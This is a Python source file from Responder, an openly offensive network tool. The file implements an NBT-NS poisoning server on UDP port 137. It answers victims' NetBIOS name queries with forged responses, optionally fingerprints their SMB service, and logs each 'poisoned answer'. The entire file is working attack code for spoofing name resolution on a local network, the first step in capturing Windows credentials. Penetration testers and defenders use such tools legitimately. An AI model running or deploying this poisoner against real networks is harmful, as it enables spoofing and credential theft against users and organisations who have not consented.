#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import socket
import threading
import core.responder.settings as settings
import core.responder.fingerprint as fingerprint

from core.responder.packets import NBT_Ans
from SocketServer import BaseRequestHandler, ThreadingMixIn, UDPServer
from core.responder.utils import *

def start():
	try:
		server = ThreadingUDPServer(('', 137), NBTNSServer)
		t = threading.Thread(name='NBTNS', target=server.serve_forever)
		t.setDaemon(True)
		t.start()
	except Exception as e:
		print "Error starting NBTNS server on port 137: {}".format(e)

class ThreadingUDPServer(ThreadingMixIn, UDPServer):
	
	allow_reuse_address = 1

	def server_bind(self):
		if OsInterfaceIsSupported():
			try:
				self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
			except:
				pass
		UDPServer.server_bind(self)

# Define what are we answering to.
def Validate_NBT_NS(data):
	if settings.Config.AnalyzeMode:
		return False

	if NBT_NS_Role(data[43:46]) == "File Server":
		return True

	if settings.Config.NBTNSDomain == True:
		if NBT_NS_Role(data[43:46]) == "Domain Controller":
			return True

	if settings.Config.Wredirect == True:
		if NBT_NS_Role(data[43:46]) == "Workstation/Redirector":
			return True

	else:
		return False

# NBT_NS Server class.
class NBTNSServer(BaseRequestHandler):

	def handle(self):

		data, socket = self.request
		Name = Decode_Name(data[13:45])

		# Break out if we don't want to respond to this host
		if RespondToThisHost(self.client_address[0], Name) is not True:
			return None

		if data[2:4] == "\x01\x10":

			if settings.Config.Finger_On_Off:
				Finger = fingerprint.RunSmbFinger((self.client_address[0],445))
			else:
				Finger = None

			# Analyze Mode
			if settings.Config.AnalyzeMode:
				settings.Config.AnalyzeLogger.warning("{} [Analyze mode: NBT-NS] Request for {}, ignoring".format(self.client_address[0], Name))

			# Poisoning Mode
			else:
				Buffer = NBT_Ans()
				Buffer.calculate(data)
				socket.sendto(str(Buffer), self.client_address)

				settings.Config.PoisonersLogger.warning("{} [NBT-NS] Poisoned answer for name {} (service: {})" .format(self.client_address[0], Name, NBT_NS_Role(data[43:46])))

			if Finger is not None:
				settings.Config.ResponderLogger.info("[FINGER] OS Version     : {}".format(Finger[0]))
				settings.Config.ResponderLogger.info("[FINGER] Client Version : {}".format(Finger[1]))
